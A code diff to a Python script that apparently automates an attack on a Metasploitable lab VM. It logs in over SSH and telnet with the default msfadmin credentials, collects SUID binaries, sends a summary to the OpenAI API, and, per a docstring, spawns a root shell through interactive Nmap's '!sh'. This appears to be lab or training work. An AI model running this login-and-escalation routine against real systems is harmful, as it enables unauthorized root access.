@@ -20,9 +20,11 @@ import openai
 import os
 # import subprocess
 import pexpect
+from dotenv import load_dotenv
+load_dotenv()  # dotenv from load_dotenv
 
 # Remote connection details
-VICTIM_IP = "192.168.12.41"
+VICTIM_IP = "10.0.0.177"
 SSH_PORT = 22
 USERNAME = "msfadmin"
 PASSWORD = "msfadmin"
@@ -31,7 +33,7 @@ SMALL_FILE = "small_report.txt"
 AI_OUTPUT = "ai_output.txt"
 openai.api_key = os.getenv("OPENAI_API_KEY")
 
-
+# Helper functions
 def run_remote_command(client, command):
     """Run a command on the remote victim machine."""
     stdin, stdout, stderr = client.exec_command(command)
@@ -97,7 +99,6 @@ def create_small_file(report_file, small_file):
 
             # Collect data based on the current section
             if current_section == "SUID Binaries" and line and not line.startswith("==="):
-                #if any(binary in line for binary in ["nmap", "passwd"]):  # Check for specific binaries
                 suid_binaries.append(line)
 
         # Construct the small report
@@ -231,8 +232,8 @@ def telnet_to_metasploitable():
     logging in with the default credentials, and opening an interactive
     Nmap shell to spawn a root shell using `!sh`.
     """
-    host = "192.168.12.41"  # Replace with your Metasploitable IP
-    telnet_command = f"telnet {host}"
+    # host = "192.168.12.41"  # Replace with your Metasploitable IP
+    telnet_command = f"telnet {VICTIM_IP}"
     metasploitable_user = "msfadmin"  # Default username
     metasploitable_pass = "msfadmin"  # Default password
 
